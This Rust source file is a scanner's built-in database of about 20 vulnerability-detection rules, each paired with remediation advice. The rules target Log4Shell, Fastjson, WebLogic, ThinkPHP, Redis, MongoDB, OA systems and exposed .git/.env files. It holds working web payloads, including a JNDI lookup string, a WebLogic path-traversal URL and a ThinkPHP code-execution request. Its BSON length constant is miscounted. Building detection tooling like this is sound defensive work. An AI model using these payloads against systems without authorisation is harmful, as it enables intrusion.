//! 内置 PoC 规则数据库
//!
//! 包含约 20 条预编译的常见内网漏洞检测规则

use crate::vuln::poc::*;
use std::collections::HashMap;

/// 获取所有内置 PoC 规则
pub fn get_builtin_pocs() -> Vec<PoCRule> {
    vec![
        // === 反序列化 ===
        shiro_550_detect(),
        fastjson_detect(),
        log4shell_detect(),
        // === 未授权访问 ===
        nacos_unauth(),
        jenkins_unauth(),
        elasticsearch_unauth(),
        harbor_unauth(),
        spring_boot_actuator(),
        // === OA 系统 ===
        weaver_oa_detect(),
        zhiyuan_oa_detect(),
        tongda_oa_detect(),
        lanling_oa_detect(),
        // === RCE / 高危 ===
        weblogic_unauth(),
        thinkphp_rce(),
        phpmyadmin_setup(),
        // === TCP 协议 ===
        redis_unauth(),
        mongodb_unauth(),
        // === 信息泄露 ===
        git_exposure(),
        env_file_exposure(),
        druid_unauth(),
    ]
}

/// 按严重性和类别过滤内置 PoC
pub fn filter_builtin_pocs(severity: Option<Severity>, category: Option<&str>) -> Vec<PoCRule> {
    get_builtin_pocs()
        .into_iter()
        .filter(|poc| {
            if let Some(sev) = severity {
                if poc.info.severity != sev {
                    return false;
                }
            }
            if let Some(cat) = category {
                if !poc.info.category.contains(cat) && !poc.info.name.contains(cat) {
                    return false;
                }
            }
            true
        })
        .collect()
}

// ============================================================
// 反序列化
// ============================================================

fn shiro_550_detect() -> PoCRule {
    let mut headers = HashMap::new();
    headers.insert("Cookie".to_string(), "rememberMe=test_value".to_string());

    PoCRule {
        id: "shiro-550-detect".to_string(),
        info: PoCInfo {
            name: "Apache Shiro 反序列化检测".to_string(),
            severity: Severity::High,
            category: "反序列化".to_string(),
            description: "通过rememberMe Cookie检测Shiro框架，可能存在默认密钥反序列化漏洞".to_string(),
            tags: vec!["shiro".to_string(), "deserialization".to_string()],
            remediation: "升级Shiro至最新版本，更换默认密钥".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/".to_string(),
            headers,
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "and".to_string(),
            matchers: vec![Matcher {
                matcher_type: MatcherType::Word,
                part: "header".to_string(),
                words: vec!["rememberMe=deleteMe".to_string()],
                regex: vec![],
                status: vec![],
                binary: vec![],
                negative: false,
            }],
        }],
    }
}

fn fastjson_detect() -> PoCRule {
    let mut headers = HashMap::new();
    headers.insert("Content-Type".to_string(), "application/json".to_string());

    PoCRule {
        id: "fastjson-detect".to_string(),
        info: PoCInfo {
            name: "Fastjson 反序列化检测".to_string(),
            severity: Severity::High,
            category: "反序列化".to_string(),
            description: "检测Fastjson JSON反序列化漏洞".to_string(),
            tags: vec!["fastjson".to_string(), "deserialization".to_string()],
            remediation: "升级Fastjson到1.2.83+或2.x版本，启用safeMode".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "POST".to_string(),
            path: "/".to_string(),
            headers,
            body: Some(r#"{"@type":"java.net.Inet4Address","val":"dns.test.com"}"#.to_string()),
            data: None,
            read_size: None,
            matchers_condition: "or".to_string(),
            matchers: vec![
                Matcher {
                    matcher_type: MatcherType::Word,
                    part: "body".to_string(),
                    words: vec!["autoType".to_string(), "safeMode".to_string()],
                    regex: vec![],
                    status: vec![],
                    binary: vec![],
                    negative: false,
                },
                Matcher {
                    matcher_type: MatcherType::Status,
                    part: "status_code".to_string(),
                    words: vec![],
                    regex: vec![],
                    status: vec![500],
                    binary: vec![],
                    negative: false,
                },
            ],
        }],
    }
}

fn log4shell_detect() -> PoCRule {
    let mut headers = HashMap::new();
    headers.insert(
        "X-Api-Version".to_string(),
        "${jndi:ldap://test.log4j}".to_string(),
    );

    PoCRule {
        id: "log4shell-detect".to_string(),
        info: PoCInfo {
            name: "Log4Shell (CVE-2021-44228) 检测".to_string(),
            severity: Severity::Critical,
            category: "反序列化".to_string(),
            description: "检测Apache Log4j JNDI注入漏洞".to_string(),
            tags: vec!["log4j".to_string(), "jndi".to_string()],
            remediation: "升级Log4j到2.17.1+版本".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/".to_string(),
            headers,
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "or".to_string(),
            matchers: vec![Matcher {
                matcher_type: MatcherType::Regex,
                part: "body".to_string(),
                words: vec![],
                regex: vec![r"(?i)log4j".to_string()],
                status: vec![],
                binary: vec![],
                negative: false,
            }],
        }],
    }
}

// ============================================================
// 未授权访问
// ============================================================

fn nacos_unauth() -> PoCRule {
    PoCRule {
        id: "nacos-unauth".to_string(),
        info: PoCInfo {
            name: "Nacos 未授权访问".to_string(),
            severity: Severity::Critical,
            category: "未授权".to_string(),
            description: "Nacos配置中心未授权访问，可获取配置信息".to_string(),
            tags: vec!["nacos".to_string()],
            remediation: "启用Nacos认证，设置正确的鉴权配置".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/nacos/v1/auth/users?pageNo=1&pageSize=9".to_string(),
            headers: HashMap::new(),
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "and".to_string(),
            matchers: vec![
                Matcher {
                    matcher_type: MatcherType::Word,
                    part: "body".to_string(),
                    words: vec!["username".to_string(), "password".to_string()],
                    regex: vec![],
                    status: vec![],
                    binary: vec![],
                    negative: false,
                },
                Matcher {
                    matcher_type: MatcherType::Status,
                    part: "status_code".to_string(),
                    words: vec![],
                    regex: vec![],
                    status: vec![200],
                    binary: vec![],
                    negative: false,
                },
            ],
        }],
    }
}

fn jenkins_unauth() -> PoCRule {
    PoCRule {
        id: "jenkins-unauth".to_string(),
        info: PoCInfo {
            name: "Jenkins 未授权访问".to_string(),
            severity: Severity::Critical,
            category: "未授权".to_string(),
            description: "Jenkins控制台未授权访问".to_string(),
            tags: vec!["jenkins".to_string()],
            remediation: "启用Jenkins安全配置，设置认证".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/script".to_string(),
            headers: HashMap::new(),
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "and".to_string(),
            matchers: vec![
                Matcher {
                    matcher_type: MatcherType::Word,
                    part: "body".to_string(),
                    words: vec!["Groovy".to_string()],
                    regex: vec![],
                    status: vec![],
                    binary: vec![],
                    negative: false,
                },
                Matcher {
                    matcher_type: MatcherType::Status,
                    part: "status_code".to_string(),
                    words: vec![],
                    regex: vec![],
                    status: vec![200],
                    binary: vec![],
                    negative: false,
                },
            ],
        }],
    }
}

fn elasticsearch_unauth() -> PoCRule {
    PoCRule {
        id: "elasticsearch-unauth".to_string(),
        info: PoCInfo {
            name: "Elasticsearch 未授权访问".to_string(),
            severity: Severity::Critical,
            category: "未授权".to_string(),
            description: "Elasticsearch API未授权访问".to_string(),
            tags: vec!["elasticsearch".to_string()],
            remediation: "在elasticsearch.yml中启用x-pack安全配置".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/_cat/indices".to_string(),
            headers: HashMap::new(),
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "and".to_string(),
            matchers: vec![
                Matcher {
                    matcher_type: MatcherType::Word,
                    part: "body".to_string(),
                    words: vec!["green".to_string(), "yellow".to_string()],
                    regex: vec![],
                    status: vec![],
                    binary: vec![],
                    negative: false,
                },
                Matcher {
                    matcher_type: MatcherType::Status,
                    part: "status_code".to_string(),
                    words: vec![],
                    regex: vec![],
                    status: vec![200],
                    binary: vec![],
                    negative: false,
                },
            ],
        }],
    }
}

fn harbor_unauth() -> PoCRule {
    PoCRule {
        id: "harbor-unauth".to_string(),
        info: PoCInfo {
            name: "Harbor 未授权访问".to_string(),
            severity: Severity::High,
            category: "未授权".to_string(),
            description: "Harbor镜像仓库未授权访问".to_string(),
            tags: vec!["harbor".to_string(), "docker".to_string()],
            remediation: "启用Harbor认证配置".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/api/v2.0/projects".to_string(),
            headers: HashMap::new(),
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "and".to_string(),
            matchers: vec![
                Matcher {
                    matcher_type: MatcherType::Word,
                    part: "body".to_string(),
                    words: vec!["project_id".to_string(), "repo_count".to_string()],
                    regex: vec![],
                    status: vec![],
                    binary: vec![],
                    negative: false,
                },
                Matcher {
                    matcher_type: MatcherType::Status,
                    part: "status_code".to_string(),
                    words: vec![],
                    regex: vec![],
                    status: vec![200],
                    binary: vec![],
                    negative: false,
                },
            ],
        }],
    }
}

fn spring_boot_actuator() -> PoCRule {
    PoCRule {
        id: "spring-boot-actuator".to_string(),
        info: PoCInfo {
            name: "Spring Boot Actuator 端点泄露".to_string(),
            severity: Severity::High,
            category: "信息泄露".to_string(),
            description: "Spring Boot Actuator敏感端点暴露".to_string(),
            tags: vec!["spring".to_string(), "actuator".to_string()],
            remediation: "限制Actuator端点暴露，配置management.endpoints.web.exposure.exclude".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/actuator/env".to_string(),
            headers: HashMap::new(),
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "and".to_string(),
            matchers: vec![
                Matcher {
                    matcher_type: MatcherType::Word,
                    part: "body".to_string(),
                    words: vec!["activeProfiles".to_string(), "propertySources".to_string()],
                    regex: vec![],
                    status: vec![],
                    binary: vec![],
                    negative: false,
                },
                Matcher {
                    matcher_type: MatcherType::Status,
                    part: "status_code".to_string(),
                    words: vec![],
                    regex: vec![],
                    status: vec![200],
                    binary: vec![],
                    negative: false,
                },
            ],
        }],
    }
}

// ============================================================
// OA 系统
// ============================================================

fn weaver_oa_detect() -> PoCRule {
    PoCRule {
        id: "weaver-oa-info".to_string(),
        info: PoCInfo {
            name: "泛微OA 信息泄露".to_string(),
            severity: Severity::High,
            category: "OA系统".to_string(),
            description: "泛微OA系统敏感信息泄露".to_string(),
            tags: vec!["weaver".to_string(), "oa".to_string()],
            remediation: "升级泛微OA至最新安全补丁".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/api/hrm/resource/read".to_string(),
            headers: HashMap::new(),
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "or".to_string(),
            matchers: vec![Matcher {
                matcher_type: MatcherType::Word,
                part: "all".to_string(),
                words: vec!["weaver".to_string(), "ecology".to_string()],
                regex: vec![],
                status: vec![],
                binary: vec![],
                negative: false,
            }],
        }],
    }
}

fn zhiyuan_oa_detect() -> PoCRule {
    PoCRule {
        id: "zhiyuan-oa-info".to_string(),
        info: PoCInfo {
            name: "致远OA 状态监控页面泄露".to_string(),
            severity: Severity::Medium,
            category: "OA系统".to_string(),
            description: "致远OA状态监控页面暴露内部信息".to_string(),
            tags: vec!["seeyon".to_string(), "oa".to_string()],
            remediation: "关闭状态监控页面，限制外部访问".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/seeyon/main.do".to_string(),
            headers: HashMap::new(),
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "and".to_string(),
            matchers: vec![Matcher {
                matcher_type: MatcherType::Word,
                part: "all".to_string(),
                words: vec!["seeyon".to_string()],
                regex: vec![],
                status: vec![],
                binary: vec![],
                negative: false,
            }],
        }],
    }
}

fn tongda_oa_detect() -> PoCRule {
    PoCRule {
        id: "tongda-oa-info".to_string(),
        info: PoCInfo {
            name: "通达OA 信息检测".to_string(),
            severity: Severity::Medium,
            category: "OA系统".to_string(),
            description: "通达OA系统信息泄露检测".to_string(),
            tags: vec!["tongda".to_string(), "oa".to_string()],
            remediation: "升级通达OA至最新版本".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/inc/expired.php".to_string(),
            headers: HashMap::new(),
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "and".to_string(),
            matchers: vec![Matcher {
                matcher_type: MatcherType::Word,
                part: "all".to_string(),
                words: vec!["tongda".to_string(), "OA".to_string()],
                regex: vec![],
                status: vec![],
                binary: vec![],
                negative: false,
            }],
        }],
    }
}

fn lanling_oa_detect() -> PoCRule {
    PoCRule {
        id: "lanling-oa-info".to_string(),
        info: PoCInfo {
            name: "蓝凌OA 信息检测".to_string(),
            severity: Severity::Medium,
            category: "OA系统".to_string(),
            description: "蓝凌OA系统信息泄露检测".to_string(),
            tags: vec!["landray".to_string(), "oa".to_string()],
            remediation: "升级蓝凌OA至最新安全版本".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/admin.do".to_string(),
            headers: HashMap::new(),
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "and".to_string(),
            matchers: vec![Matcher {
                matcher_type: MatcherType::Word,
                part: "all".to_string(),
                words: vec!["landray".to_string(), "ekp".to_string()],
                regex: vec![],
                status: vec![],
                binary: vec![],
                negative: false,
            }],
        }],
    }
}

// ============================================================
// RCE / 高危漏洞
// ============================================================

fn weblogic_unauth() -> PoCRule {
    PoCRule {
        id: "weblogic-cve2020-14882".to_string(),
        info: PoCInfo {
            name: "WebLogic 未授权访问 (CVE-2020-14882)".to_string(),
            severity: Severity::Critical,
            category: "RCE".to_string(),
            description: "WebLogic控制台未授权访问漏洞".to_string(),
            tags: vec!["weblogic".to_string(), "cve-2020-14882".to_string()],
            remediation: "安装Oracle关键补丁更新".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/console/css/%252e%252e/consolejndi.portal".to_string(),
            headers: HashMap::new(),
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "and".to_string(),
            matchers: vec![
                Matcher {
                    matcher_type: MatcherType::Status,
                    part: "status_code".to_string(),
                    words: vec![],
                    regex: vec![],
                    status: vec![200],
                    binary: vec![],
                    negative: false,
                },
                Matcher {
                    matcher_type: MatcherType::Word,
                    part: "body".to_string(),
                    words: vec!["consolejndi".to_string()],
                    regex: vec![],
                    status: vec![],
                    binary: vec![],
                    negative: false,
                },
            ],
        }],
    }
}

fn thinkphp_rce() -> PoCRule {
    PoCRule {
        id: "thinkphp-rce".to_string(),
        info: PoCInfo {
            name: "ThinkPHP 5.x RCE".to_string(),
            severity: Severity::Critical,
            category: "RCE".to_string(),
            description: "ThinkPHP 5.x 远程代码执行漏洞".to_string(),
            tags: vec!["thinkphp".to_string(), "rce".to_string()],
            remediation: "升级ThinkPHP至最新安全版本".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1".to_string(),
            headers: HashMap::new(),
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "and".to_string(),
            matchers: vec![
                Matcher {
                    matcher_type: MatcherType::Word,
                    part: "body".to_string(),
                    words: vec!["PHP Version".to_string(), "phpinfo".to_string()],
                    regex: vec![],
                    status: vec![],
                    binary: vec![],
                    negative: false,
                },
                Matcher {
                    matcher_type: MatcherType::Status,
                    part: "status_code".to_string(),
                    words: vec![],
                    regex: vec![],
                    status: vec![200],
                    binary: vec![],
                    negative: false,
                },
            ],
        }],
    }
}

fn phpmyadmin_setup() -> PoCRule {
    PoCRule {
        id: "phpmyadmin-setup".to_string(),
        info: PoCInfo {
            name: "phpMyAdmin Setup 脚本暴露".to_string(),
            severity: Severity::High,
            category: "信息泄露".to_string(),
            description: "phpMyAdmin setup脚本未删除，可能被利用".to_string(),
            tags: vec!["phpmyadmin".to_string()],
            remediation: "删除setup目录，限制phpMyAdmin访问".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/setup/index.php".to_string(),
            headers: HashMap::new(),
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "and".to_string(),
            matchers: vec![
                Matcher {
                    matcher_type: MatcherType::Word,
                    part: "body".to_string(),
                    words: vec!["phpMyAdmin".to_string(), "setup".to_string()],
                    regex: vec![],
                    status: vec![],
                    binary: vec![],
                    negative: false,
                },
                Matcher {
                    matcher_type: MatcherType::Status,
                    part: "status_code".to_string(),
                    words: vec![],
                    regex: vec![],
                    status: vec![200],
                    binary: vec![],
                    negative: false,
                },
            ],
        }],
    }
}

// ============================================================
// TCP 协议
// ============================================================

fn redis_unauth() -> PoCRule {
    PoCRule {
        id: "redis-unauth".to_string(),
        info: PoCInfo {
            name: "Redis 未授权访问".to_string(),
            severity: Severity::Critical,
            category: "未授权".to_string(),
            description: "Redis服务无密码保护，可直接连接".to_string(),
            tags: vec!["redis".to_string()],
            remediation: "设置Redis密码认证(requirepass)，禁止外部访问".to_string(),
        },
        transport: Transport::Tcp,
        default_port: Some(6379),
        rules: vec![PoCRequest {
            method: String::new(),
            path: String::new(),
            headers: HashMap::new(),
            body: None,
            data: Some("INFO\r\n".to_string()),
            read_size: Some(4096),
            matchers_condition: "and".to_string(),
            matchers: vec![Matcher {
                matcher_type: MatcherType::Word,
                part: String::new(),
                words: vec!["redis_version".to_string()],
                regex: vec![],
                status: vec![],
                binary: vec![],
                negative: false,
            }],
        }],
    }
}

fn mongodb_unauth() -> PoCRule {
    PoCRule {
        id: "mongodb-unauth".to_string(),
        info: PoCInfo {
            name: "MongoDB 未授权访问".to_string(),
            severity: Severity::Critical,
            category: "未授权".to_string(),
            description: "MongoDB无认证，可直接访问数据库".to_string(),
            tags: vec!["mongodb".to_string()],
            remediation: "启用MongoDB认证(--auth)，限制网络访问".to_string(),
        },
        transport: Transport::Tcp,
        default_port: Some(27017),
        rules: vec![PoCRequest {
            method: String::new(),
            path: String::new(),
            headers: HashMap::new(),
            body: None,
            data: Some(
                bson_list_databases(),
            ),
            read_size: Some(4096),
            matchers_condition: "and".to_string(),
            matchers: vec![Matcher {
                matcher_type: MatcherType::Word,
                part: String::new(),
                words: vec!["totalSize".to_string(), "databases".to_string()],
                regex: vec![],
                status: vec![],
                binary: vec![],
                negative: false,
            }],
        }],
    }
}

/// MongoDB listDatabases 命令 (BSON编码)
fn bson_list_databases() -> String {
    // 简化: 使用原始BSON字节发送 listDatabases 命令
    // 实际BSON: {listDatabases: 1}
    let bson_bytes: Vec<u8> = vec![
        0x29, 0x00, 0x00, 0x00, // document length (41 bytes)
        0x01,                   // type: double
        0x6C, 0x69, 0x73, 0x74, 0x44, 0x61, 0x74, 0x61, 0x62, 0x61, 0x73, 0x65, 0x73, 0x00, // "listDatabases\0"
        0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // 1.0 as double
        0x00, // end
    ];
    // OP_MSG header (simplified): flags + section + payload
    let mut msg = Vec::new();
    // OP_MSG header
    msg.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // flags
    msg.push(0x00); // section kind: body
    msg.extend_from_slice(&bson_bytes);

    // Wire protocol header
    let total_len = (16 + msg.len()) as i32;
    let mut wire = Vec::new();
    wire.extend_from_slice(&total_len.to_le_bytes()); // message length
    wire.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // requestID
    wire.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // responseTo
    wire.extend_from_slice(&[0xDD, 0x07, 0x00, 0x00]); // opCode: OP_MSG (2013)
    wire.extend_from_slice(&msg);

    String::from_utf8_lossy(&wire).to_string()
}

// ============================================================
// 信息泄露
// ============================================================

fn git_exposure() -> PoCRule {
    PoCRule {
        id: "git-exposure".to_string(),
        info: PoCInfo {
            name: ".git 目录泄露".to_string(),
            severity: Severity::High,
            category: "信息泄露".to_string(),
            description: ".git目录暴露，可能导致源代码泄露".to_string(),
            tags: vec!["git".to_string()],
            remediation: "删除Web目录下的.git目录，配置Web服务器拒绝访问".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/.git/HEAD".to_string(),
            headers: HashMap::new(),
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "and".to_string(),
            matchers: vec![
                Matcher {
                    matcher_type: MatcherType::Word,
                    part: "body".to_string(),
                    words: vec!["ref: refs/".to_string()],
                    regex: vec![],
                    status: vec![],
                    binary: vec![],
                    negative: false,
                },
                Matcher {
                    matcher_type: MatcherType::Status,
                    part: "status_code".to_string(),
                    words: vec![],
                    regex: vec![],
                    status: vec![200],
                    binary: vec![],
                    negative: false,
                },
            ],
        }],
    }
}

fn env_file_exposure() -> PoCRule {
    PoCRule {
        id: "env-file-exposure".to_string(),
        info: PoCInfo {
            name: ".env 文件泄露".to_string(),
            severity: Severity::Critical,
            category: "信息泄露".to_string(),
            description: ".env配置文件暴露，可能包含数据库密码、API密钥等".to_string(),
            tags: vec!["env".to_string(), "config".to_string()],
            remediation: "禁止Web服务器访问.env文件".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/.env".to_string(),
            headers: HashMap::new(),
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "and".to_string(),
            matchers: vec![
                Matcher {
                    matcher_type: MatcherType::Word,
                    part: "body".to_string(),
                    words: vec!["DB_".to_string(), "APP_".to_string()],
                    regex: vec![],
                    status: vec![],
                    binary: vec![],
                    negative: false,
                },
                Matcher {
                    matcher_type: MatcherType::Status,
                    part: "status_code".to_string(),
                    words: vec![],
                    regex: vec![],
                    status: vec![200],
                    binary: vec![],
                    negative: false,
                },
            ],
        }],
    }
}

fn druid_unauth() -> PoCRule {
    PoCRule {
        id: "druid-unauth".to_string(),
        info: PoCInfo {
            name: "Druid 监控未授权访问".to_string(),
            severity: Severity::Medium,
            category: "信息泄露".to_string(),
            description: "Druid监控页面未授权访问，泄露数据库信息".to_string(),
            tags: vec!["druid".to_string()],
            remediation: "配置Druid监控页面的访问认证".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/druid/index.html".to_string(),
            headers: HashMap::new(),
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "and".to_string(),
            matchers: vec![
                Matcher {
                    matcher_type: MatcherType::Word,
                    part: "body".to_string(),
                    words: vec!["Druid".to_string(), "StatIndex".to_string()],
                    regex: vec![],
                    status: vec![],
                    binary: vec![],
                    negative: false,
                },
                Matcher {
                    matcher_type: MatcherType::Status,
                    part: "status_code".to_string(),
                    words: vec![],
                    regex: vec![],
                    status: vec![200],
                    binary: vec![],
                    negative: false,
                },
            ],
        }],
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_builtin_pocs_loaded() {
        let pocs = get_builtin_pocs();
        assert!(pocs.len() >= 18);
    }

    #[test]
    fn test_all_pocs_have_valid_ids() {
        let pocs = get_builtin_pocs();
        let mut ids = std::collections::HashSet::new();
        for poc in &pocs {
            assert!(!poc.id.is_empty(), "PoC has empty id");
            assert!(ids.insert(&poc.id), "Duplicate PoC id: {}", poc.id);
        }
    }

    #[test]
    fn test_all_pocs_have_matchers() {
        let pocs = get_builtin_pocs();
        for poc in &pocs {
            for rule in &poc.rules {
                assert!(
                    !rule.matchers.is_empty(),
                    "PoC {} has rule without matchers",
                    poc.id
                );
            }
        }
    }

    #[test]
    fn test_filter_by_severity() {
        let critical = filter_builtin_pocs(Some(Severity::Critical), None);
        assert!(critical.iter().all(|p| p.info.severity == Severity::Critical));

        let high = filter_builtin_pocs(Some(Severity::High), None);
        assert!(high.iter().all(|p| p.info.severity == Severity::High));
    }

    #[test]
    fn test_filter_by_category() {
        let deserialization = filter_builtin_pocs(None, Some("反序列化"));
        assert!(deserialization
            .iter()
            .all(|p| p.info.category.contains("反序列化")));

        let unauth = filter_builtin_pocs(None, Some("未授权"));
        assert!(unauth.iter().all(|p| p.info.category.contains("未授权")));
    }

    #[test]
    fn test_shiro_poc_structure() {
        let pocs = get_builtin_pocs();
        let shiro = pocs.iter().find(|p| p.id == "shiro-550-detect").unwrap();
        assert_eq!(shiro.transport, Transport::Http);
        assert_eq!(shiro.info.severity, Severity::High);
        assert_eq!(shiro.rules[0].method, "GET");
        assert!(shiro.rules[0].headers.contains_key("Cookie"));
    }

    #[test]
    fn test_redis_poc_structure() {
        let pocs = get_builtin_pocs();
        let redis = pocs.iter().find(|p| p.id == "redis-unauth").unwrap();
        assert_eq!(redis.transport, Transport::Tcp);
        assert_eq!(redis.default_port, Some(6379));
        assert!(redis.rules[0].data.is_some());
    }
}
